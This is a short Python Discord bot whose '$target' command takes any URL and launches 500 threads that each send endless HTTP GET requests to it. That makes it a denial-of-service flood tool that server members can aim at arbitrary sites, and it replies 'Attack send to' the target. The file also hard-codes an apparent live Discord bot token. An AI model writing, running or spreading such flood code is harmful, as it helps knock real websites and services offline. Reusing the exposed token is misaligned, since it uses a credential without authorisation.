import discord
import requests
import asyncio
import threading
import discord, datetime, time
from discord.ext import commands

bot = discord.Client()
bot = commands.Bot(command_prefix='$')

@bot.event
async def on_ready():
	guild_count = 0
	for guild in bot.guilds:
		print(f"- {guild.id} (name: {guild.name})")
		guild_count = guild_count + 1
	print("bot is in " + str(guild_count) + " servers.")
	
@bot.command()
async def target(ctx, *, arg):
 def attack():
   while True:
     r = requests.get(arg)
 await ctx.send(f"Attack send to {arg}")
 for i in range(500):
  thread = threading.Thread(target=attack)
  thread.start()

bot.run("MTAwMDQ4Nzg2MTg5MzczMDQxNA.GQzOpJ.3EGft0KsdSEPgoHeyS8AbWPIJjTdjEoL3cCLc4")